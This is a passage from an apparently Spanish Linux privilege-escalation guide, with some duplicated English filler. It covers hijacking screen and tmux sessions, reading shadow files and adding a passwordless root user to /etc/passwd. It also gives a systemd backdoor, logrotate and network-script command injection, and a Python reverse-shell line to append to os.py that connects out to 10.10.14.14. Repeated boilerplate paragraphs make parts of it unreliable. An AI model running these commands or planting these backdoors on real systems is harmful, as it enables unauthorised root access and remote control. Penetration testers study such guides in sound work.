En **versiones antiguas** puedes **secuestrar** alguna sesión de **shell** de otro usuario (**root**).\
En las **versiones más recientes** solo podrás **conectarte** a las sesiones de pantalla de **tu propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.

### Secuestro de sesiones de pantalla

**Listar sesiones de pantalla**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Adjuntarse a una sesión**

To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain access to a higher level of privileges and execute commands with elevated permissions.

There are several methods to attach to a session, depending on the specific circumstances and the tools available. Here are some common techniques:

1. **Screen**: The `screen` command allows you to create and manage multiple terminal sessions within a single SSH session. By attaching to an existing `screen` session, you can gain access to a user's active session and execute commands as that user.

2. **tmux**: Similar to `screen`, `tmux` is another terminal multiplexer that allows you to create and manage multiple sessions. By attaching to an active `tmux` session, you can escalate privileges and execute commands with the user's permissions.

3. **SSH session hijacking**: If you have access to the target system as a low-privileged user, you can hijack an existing SSH session of a higher-privileged user. This can be done by stealing the SSH session ID and attaching to it using tools like `reptyr` or `sshd`.

4. **Process injection**: Another method is to inject malicious code into a running process with higher privileges. This can be achieved using tools like `ptrace` or `LD_PRELOAD` to gain control over the process and execute commands with elevated permissions.

It is important to note that attaching to a session and escalating privileges should only be done for legitimate purposes, such as penetration testing or system administration. Unauthorized access and privilege escalation are illegal activities and can result in severe consequences.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Secuestro de sesiones de tmux

Este era un problema con **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como un usuario sin privilegios.

**Listar sesiones de tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Adjuntarse a una sesión**

To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain access to a higher level of privileges and execute commands with elevated permissions.

There are several methods to attach to a session, depending on the specific circumstances and the tools available. Here are some common techniques:

1. **Screen**: The `screen` command allows you to create and manage multiple terminal sessions within a single SSH session. By attaching to an existing `screen` session, you can gain access to the user's environment and execute commands as that user.

2. **tmux**: Similar to `screen`, `tmux` is a terminal multiplexer that allows you to create and manage multiple terminal sessions. By attaching to an existing `tmux` session, you can gain access to the user's environment and execute commands with their privileges.

3. **SSH session hijacking**: If you have access to the target system as a low-privileged user, you can hijack an existing SSH session of a higher-privileged user. This can be done by stealing the SSH session ID and attaching to it using tools like `reptyr` or `sshd`.

4. **Process injection**: Another method is to inject malicious code into a running process with higher privileges. This can be achieved using tools like `ptrace` or `LD_PRELOAD` to gain control over the process and execute commands with elevated permissions.

It is important to note that attaching to a session and escalating privileges should only be done for legitimate purposes, such as penetration testing or system administration. Unauthorized access and privilege escalation are illegal activities and can result in severe consequences.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Revisa **Valentine box de HTB** para un ejemplo.

## SSH

### Debian OpenSSL PRNG predecible - CVE-2008-0166

Todas las claves SSL y SSH generadas en sistemas basados en Debian (Ubuntu, Kubuntu, etc) entre septiembre de 2006 y el 13 de mayo de 2008 pueden verse afectadas por este error.\
Este error se produce al crear una nueva clave ssh en esos sistemas operativos, ya que solo eran posibles **32,768 variaciones**. Esto significa que todas las posibilidades se pueden calcular y **teniendo la clave pública ssh puedes buscar la clave privada correspondiente**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores de configuración interesantes de SSH

* **PasswordAuthentication:** Especifica si se permite la autenticación por contraseña. El valor predeterminado es `no`.
* **PubkeyAuthentication:** Especifica si se permite la autenticación mediante clave pública. El valor predeterminado es `yes`.
* **PermitEmptyPasswords**: Cuando se permite la autenticación por contraseña, especifica si el servidor permite el inicio de sesión en cuentas con cadenas de contraseña vacías. El valor predeterminado es `no`.

### PermitRootLogin

Especifica si el usuario root puede iniciar sesión mediante ssh, el valor predeterminado es `no`. Los valores posibles son:

* `yes`: root puede iniciar sesión usando contraseña y clave privada
* `without-password` o `prohibit-password`: root solo puede iniciar sesión con una clave privada
* `forced-commands-only`: root solo puede iniciar sesión usando una clave privada y si se especifican las opciones de comandos
* `no` : no

### AuthorizedKeysFile

Especifica los archivos que contienen las claves públicas que se pueden utilizar para la autenticación de usuarios. Puede contener tokens como `%h`, que serán reemplazados por el directorio principal. **Puedes indicar rutas absolutas** (que comienzan con `/`) o **rutas relativas desde el directorio principal del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que si intentas iniciar sesión con la **clave privada** del usuario "**testusername**", SSH comparará la clave pública de tu clave con las que se encuentran en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

El reenvío del agente SSH te permite **utilizar tus claves SSH locales en lugar de dejar las claves** (¡sin frases de contraseña!) en tu servidor. De esta manera, podrás **saltar** a través de SSH **a un host** y desde allí **saltar a otro** host **utilizando** la **clave** ubicada en tu **host inicial**.

Debes configurar esta opción en `$HOME/.ssh.config` de la siguiente manera:
```
Host example.com
ForwardAgent yes
```
Ten en cuenta que si `Host` es `*`, cada vez que el usuario salte a una máquina diferente, esa máquina podrá acceder a las claves (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **anular** esta **opción** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío del agente SSH con la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitir).

Si descubres que el reenvío del agente está configurado en un entorno, lee la siguiente página, ya que **podrías aprovecharlo para escalar privilegios**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Archivos interesantes

### Archivos de perfiles

El archivo `/etc/profile` y los archivos en `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia una nueva shell**. Por lo tanto, si puedes **escribir o modificar alguno de ellos, puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si se encuentra algún script de perfil extraño, debes revisarlo en busca de **detalles sensibles**.

### Archivos Passwd/Shadow

Dependiendo del sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` pueden tener un nombre diferente o puede haber una copia de seguridad. Por lo tanto, se recomienda **encontrar todos ellos** y **verificar si puedes leerlos** para ver **si hay hashes** dentro de los archivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones puedes encontrar **hashes de contraseñas** dentro del archivo `/etc/passwd` (o equivalente).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd escribible

Primero, genera una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Luego, añade el usuario `hacker` y agrega la contraseña generada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ej: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Alternativamente, puedes usar las siguientes líneas para agregar un usuario ficticio sin contraseña.\
ADVERTENCIA: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: En las plataformas BSD, `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`, y `/etc/shadow` se renombra a `/etc/spwd.db`.

Debes verificar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración del servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/**, entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu puerta trasera se ejecutará la próxima vez que se inicie tomcat.

### Verificar Carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero intenta).
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicación Extraña/Archivos Propios

Sometimes, during a penetration test or security assessment, you may come across files or directories in unusual locations that are owned by a user or group. These files can potentially be used for privilege escalation.

#### Identifying Weird Locations

To identify these weird locations, you can start by looking for files or directories that are not commonly found in a standard Linux installation. Some examples include:

- Files or directories in the `/tmp` directory that are not related to temporary files.
- Files or directories in the `/var/tmp` directory that are not related to temporary files.
- Files or directories in the `/dev/shm` directory that are not related to shared memory.
- Files or directories in the `/var/www/html` directory that are not related to web content.
- Files or directories in the home directories of users that are not related to their normal activities.

#### Analyzing Owned Files

Once you have identified these weird locations, you can analyze the owned files to determine if they can be leveraged for privilege escalation. Some things to look for include:

- SUID or SGID permissions on executables owned by privileged users or groups.
- World-writable files or directories owned by privileged users or groups.
- Configuration files that contain sensitive information, such as database credentials or API keys.
- Scripts or binaries that are executed with elevated privileges.

#### Exploiting Owned Files

If you find files or directories in weird locations that can be exploited, you can attempt to escalate privileges by leveraging them. Some techniques you can try include:

- Exploiting SUID or SGID executables to execute commands with elevated privileges.
- Modifying world-writable files or directories to execute arbitrary commands.
- Abusing misconfigured or vulnerable scripts or binaries to escalate privileges.
- Extracting sensitive information from configuration files to gain additional access.

Remember to always exercise caution and obtain proper authorization before attempting any privilege escalation techniques.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos

To identify recently modified files on a Linux system, you can use the `find` command with the `-mmin` option. This allows you to search for files that have been modified within a specified number of minutes.

To find files modified in the last 10 minutes, you can use the following command:

```bash
find / -type f -mmin -10
```

This command will search the entire file system (`/`) for regular files (`-type f`) that have been modified within the last 10 minutes (`-mmin -10`).

You can adjust the number of minutes as needed to fit your specific requirements. Additionally, you can specify a different directory instead of the root directory (`/`) to limit the search to a specific location.

Keep in mind that this command may take some time to complete, especially if you are searching a large file system.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Archivos de bases de datos Sqlite

Los archivos de bases de datos Sqlite son archivos utilizados por aplicaciones para almacenar datos de forma estructurada. Estos archivos pueden contener información confidencial, como contraseñas, nombres de usuario u otra información sensible. Por lo tanto, es importante asegurarse de que estos archivos estén protegidos adecuadamente para evitar el acceso no autorizado.

En el contexto de la escalada de privilegios, los archivos de bases de datos Sqlite pueden ser un objetivo atractivo para un atacante, ya que pueden contener información valiosa que podría ayudar a obtener acceso a niveles más altos de privilegios en un sistema.

Algunas medidas que se pueden tomar para proteger los archivos de bases de datos Sqlite incluyen:

- Asegurarse de que los permisos de archivo sean adecuados y restringidos solo a los usuarios y procesos necesarios.
- Encriptar los archivos de bases de datos para proteger su contenido en caso de acceso no autorizado.
- Implementar medidas de seguridad adicionales, como la autenticación de usuarios y el registro de auditoría, para monitorear y controlar el acceso a los archivos de bases de datos.

Es importante tener en cuenta que estas medidas de protección deben complementarse con otras prácticas de seguridad, como mantener el sistema operativo y las aplicaciones actualizadas, utilizar contraseñas seguras y realizar copias de seguridad regulares de los archivos de bases de datos.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Archivos \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Archivos ocultos

Los archivos ocultos son archivos que comienzan con un punto (.) en su nombre y no son visibles de forma predeterminada en el sistema de archivos. Estos archivos suelen contener información sensible o configuraciones importantes que no se supone que sean modificadas por usuarios no autorizados.

En Linux, los archivos ocultos se utilizan comúnmente para almacenar configuraciones de aplicaciones y datos de usuario. Algunos ejemplos de archivos ocultos son `.bashrc`, `.gitignore` y `.ssh/id_rsa`.

Los archivos ocultos pueden ser útiles para los atacantes durante una escalada de privilegios, ya que pueden contener información confidencial o claves de acceso que podrían permitirles obtener acceso no autorizado a sistemas o datos sensibles.

Es importante tener en cuenta la existencia de archivos ocultos durante una evaluación de seguridad o una prueba de penetración, ya que pueden revelar información valiosa sobre la configuración del sistema y posibles puntos débiles.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binarios en PATH**

Los scripts y binarios que se encuentran en la variable de entorno PATH son ejecutables directamente desde cualquier ubicación en el sistema. Esto puede ser aprovechado por un atacante para escalar privilegios si encuentra un script o binario vulnerable en una ubicación accesible.

Para evitar este tipo de riesgo, se deben seguir las siguientes recomendaciones:

- **Eliminar scripts y binarios innecesarios**: Revise los scripts y binarios en la variable PATH y elimine aquellos que no sean necesarios para el funcionamiento del sistema.

- **Restringir permisos**: Asegúrese de que los scripts y binarios en PATH tengan permisos adecuados y solo sean ejecutables por usuarios autorizados.

- **Actualizar y parchear**: Mantenga actualizados los scripts y binarios en PATH para evitar vulnerabilidades conocidas.

- **Auditar PATH**: Realice auditorías regulares para identificar scripts y binarios no autorizados o sospechosos en PATH.

- **Limitar PATH**: Restrinja la variable PATH solo a las ubicaciones necesarias para el funcionamiento del sistema, evitando agregar ubicaciones innecesarias o no confiables.

Siguiendo estas prácticas de seguridad, se puede reducir el riesgo de escalada de privilegios a través de scripts y binarios en PATH.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Archivos web**

Web files are an essential part of any web application. They contain the code, scripts, and resources that make up the website. These files are stored on the web server and are accessible to users through their web browsers.

Los archivos web son una parte esencial de cualquier aplicación web. Contienen el código, los scripts y los recursos que conforman el sitio web. Estos archivos se almacenan en el servidor web y están accesibles para los usuarios a través de sus navegadores web.

### **File permissions**

File permissions determine who can read, write, and execute files on a Linux system. They are set for three different user groups: the owner of the file, the group that the file belongs to, and all other users.

Los permisos de archivo determinan quién puede leer, escribir y ejecutar archivos en un sistema Linux. Se establecen para tres grupos de usuarios diferentes: el propietario del archivo, el grupo al que pertenece el archivo y todos los demás usuarios.

### **Privilege escalation**

Privilege escalation is the process of gaining higher levels of access or privileges on a system. It allows an attacker to bypass restrictions and perform actions that are normally restricted to privileged users.

La escalada de privilegios es el proceso de obtener niveles más altos de acceso o privilegios en un sistema. Permite a un atacante eludir restricciones y realizar acciones que normalmente están restringidas a usuarios privilegiados.

### **Exploiting vulnerabilities**

Exploiting vulnerabilities is a common technique used by hackers to gain unauthorized access to a system. By identifying and exploiting weaknesses in software or systems, attackers can gain control over the target system and perform malicious actions.

Explotar vulnerabilidades es una técnica común utilizada por los hackers para obtener acceso no autorizado a un sistema. Al identificar y explotar debilidades en el software o los sistemas, los atacantes pueden tomar el control del sistema objetivo y realizar acciones maliciosas.

### **Privilege escalation techniques**

There are several techniques that can be used to escalate privileges on a Linux system. Some common techniques include:

- Exploiting misconfigured file permissions: If file permissions are set incorrectly, an attacker may be able to modify or execute files that they should not have access to.

- Exploiting software vulnerabilities: By identifying and exploiting vulnerabilities in software, an attacker can gain higher levels of access on a system.

- Exploiting weak user passwords: If a user has a weak password, an attacker may be able to guess or crack the password and gain access to the user's account.

- Exploiting insecure system configurations: If a system is not properly configured, an attacker may be able to exploit configuration weaknesses to gain higher levels of access.

Existen varias técnicas que se pueden utilizar para escalar privilegios en un sistema Linux. Algunas técnicas comunes incluyen:

- Explotar permisos de archivo mal configurados: si los permisos de archivo se configuran incorrectamente, un atacante puede modificar o ejecutar archivos a los que no debería tener acceso.

- Explotar vulnerabilidades de software: al identificar y explotar vulnerabilidades en el software, un atacante puede obtener niveles más altos de acceso en un sistema.

- Explotar contraseñas débiles de usuario: si un usuario tiene una contraseña débil, un atacante puede adivinar o descifrar la contraseña y obtener acceso a la cuenta del usuario.

- Explotar configuraciones inseguras del sistema: si un sistema no está configurado correctamente, un atacante puede aprovechar las debilidades de configuración para obtener niveles más altos de acceso.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Copias de seguridad**

Las copias de seguridad son una parte fundamental de cualquier estrategia de seguridad. Realizar copias de seguridad periódicas de los datos críticos es esencial para protegerlos contra la pérdida o el acceso no autorizado. Además, las copias de seguridad también pueden ser útiles en caso de desastres naturales, errores humanos o ataques cibernéticos.

Aquí hay algunas prácticas recomendadas para asegurar las copias de seguridad:

- **Almacenamiento seguro**: Asegúrese de que las copias de seguridad se almacenen en un lugar seguro, lejos del sistema original. Esto puede incluir almacenamiento en la nube, unidades externas o servidores dedicados.

- **Encriptación**: Siempre encripte las copias de seguridad para proteger los datos confidenciales. Esto garantiza que incluso si alguien obtiene acceso a las copias de seguridad, no podrán leer la información sin la clave de encriptación.

- **Pruebas de restauración**: Regularmente, realice pruebas de restauración para asegurarse de que las copias de seguridad sean válidas y se puedan restaurar correctamente. Esto ayuda a identificar cualquier problema antes de que sea demasiado tarde.

- **Políticas de retención**: Establezca políticas de retención para determinar cuánto tiempo se deben conservar las copias de seguridad. Esto puede basarse en requisitos legales, regulaciones de la industria o simplemente en la importancia de los datos.

- **Seguridad de acceso**: Asegúrese de que solo las personas autorizadas tengan acceso a las copias de seguridad. Esto implica implementar medidas de autenticación y control de acceso adecuadas.

Recuerde que las copias de seguridad son una medida preventiva importante, pero no deben ser la única medida de seguridad. Es esencial implementar otras prácticas de seguridad, como la protección contra malware, la actualización regular del software y la configuración adecuada de los permisos de usuario.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Archivos conocidos que contienen contraseñas

Lee el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), busca **varios archivos posibles que podrían contener contraseñas**.\
Otra herramienta interesante que puedes usar para hacer esto es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), que es una aplicación de código abierto utilizada para recuperar muchas contraseñas almacenadas en una computadora local para Windows, Linux y Mac.

### Registros

Si puedes leer registros, es posible que puedas encontrar **información interesante/confidencial dentro de ellos**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos registros de auditoría "**mal**" configurados (¿con puerta trasera?) pueden permitirte **grabar contraseñas** dentro de los registros de auditoría, como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **leer registros del grupo** [**adm**](interesting-groups-linux-pe/#grupo-adm) será de gran ayuda.

### Archivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Búsqueda/Regex de Credenciales Genéricas

También debes verificar archivos que contengan la palabra "**password**" en su **nombre** o dentro del **contenido**, y también buscar IPs y correos electrónicos dentro de los registros, o expresiones regulares de hashes.\
No voy a enumerar aquí cómo hacer todo esto, pero si estás interesado, puedes revisar las últimas comprobaciones que realiza [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Archivos con permisos de escritura

### Secuestro de bibliotecas de Python

Si sabes desde **dónde** se va a ejecutar un script de Python y **puedes escribir dentro** de esa carpeta o **modificar bibliotecas de Python**, puedes modificar la biblioteca del sistema operativo y agregarle una puerta trasera (si puedes escribir donde se va a ejecutar el script de Python, copia y pega la biblioteca os.py).

Para **agregar una puerta trasera a la biblioteca**, simplemente agrega al final de la biblioteca os.py la siguiente línea (cambia la IP y el PUERTO):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Explotación de Logrotate

Existe una vulnerabilidad en `logrotate` que permite a un usuario con **permisos de escritura sobre un archivo de registro** o **cualquiera** de sus **directorios padre** hacer que `logrotate` escriba **un archivo en cualquier ubicación**. Si **logrotate** se está ejecutando como **root**, entonces el usuario podrá escribir cualquier archivo en _**/etc/bash\_completion.d/**_ que será ejecutado por cualquier usuario que inicie sesión.\
Entonces, si tienes **permisos de escritura** sobre un **archivo de registro** **o** cualquiera de sus **carpetas padre**, puedes **elevar privilegios** (en la mayoría de las distribuciones de Linux, logrotate se ejecuta automáticamente una vez al día como **usuario root**). También verifica si, aparte de _/var/log_, hay más archivos que se están **rotando**.

{% hint style="info" %}
Esta vulnerabilidad afecta a la versión `3.18.0` y anteriores de `logrotate`.
{% endhint %}

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(registros de nginx)**, así que siempre que descubras que puedes alterar registros, verifica quién está gestionando esos registros y comprueba si puedes elevar privilegios sustituyendo los registros por enlaces simbólicos.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

Si, por alguna razón, un usuario puede **escribir** un script `ifcf-<loquesea>` en _/etc/sysconfig/network-scripts_ **o** puede **ajustar** uno existente, entonces tu **sistema está comprometido**.

Los scripts de red, como _ifcg-eth0_, se utilizan para las conexiones de red. Se ven exactamente como archivos .INI. Sin embargo, se \~ejecutan\~ en Linux mediante Network Manager (dispatcher.d).

En mi caso, el atributo `NAME=` en estos scripts de red no se maneja correctamente. Si tienes **espacios en blanco en el nombre, el sistema intenta ejecutar la parte después del espacio en blanco**. Esto significa que **todo después del primer espacio en blanco se ejecuta como root**.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**Referencia de vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init, init.d, systemd y rc.d**

`/etc/init.d` contiene **scripts** utilizados por las herramientas de inicio del sistema V (SysVinit). Este es el **paquete de gestión de servicios tradicional para Linux**, que contiene el programa `init` (el primer proceso que se ejecuta cuando el kernel ha terminado de inicializarse¹) así como alguna infraestructura para iniciar y detener servicios y configurarlos. Específicamente, los archivos en `/etc/init.d` son scripts de shell que responden a los comandos `start`, `stop`, `restart` y (cuando se admite) `reload` para administrar un servicio en particular. Estos scripts se pueden invocar directamente o (más comúnmente) a través de algún otro disparador (normalmente la presencia de un enlace simbólico en `/etc/rc?.d/`). (De [aquí](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)). Otra alternativa a esta carpeta es `/etc/rc.d/init.d` en Redhat.

`/etc/init` contiene archivos de **configuración** utilizados por **Upstart**. Upstart es un paquete de gestión de servicios joven promovido por Ubuntu. Los archivos en `/etc/init` son archivos de configuración que le indican a Upstart cómo y cuándo `start`, `stop`, `reload` la configuración o consultar el `status` de un servicio. A partir de Lucid, Ubuntu está haciendo la transición de SysVinit a Upstart, lo que explica por qué muchos servicios vienen con scripts de SysVinit a pesar de que se prefieren los archivos de configuración de Upstart. Los scripts de SysVinit son procesados por una capa de compatibilidad en Upstart. (De [aquí](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)).

**systemd** es un **sistema de inicialización y administrador de servicios de Linux** que incluye características como el inicio bajo demanda de demonios, el mantenimiento de puntos de montaje y automontaje, el soporte de instantáneas y el seguimiento de procesos mediante grupos de control de Linux. systemd proporciona un demonio de registro y otras herramientas y utilidades para ayudar con las tareas comunes de administración del sistema. (De [aquí](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)).

Los archivos que se envían en paquetes descargados del repositorio de distribución se colocan en `/usr/lib/systemd/`. Las modificaciones realizadas por el administrador del sistema (usuario) se colocan en `/etc/systemd/system/`.

## Otros trucos

### Escalada de privilegios de NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Escapando de las shells restringidas

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Protecciones de seguridad del kernel

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Más ayuda

[Binarios estáticos de impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Herramientas de escalada de privilegios de Linux/Unix

### **Mejor herramienta para buscar vectores de escalada de privilegios locales en Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opción -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en Linux y MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acceso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referencias

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
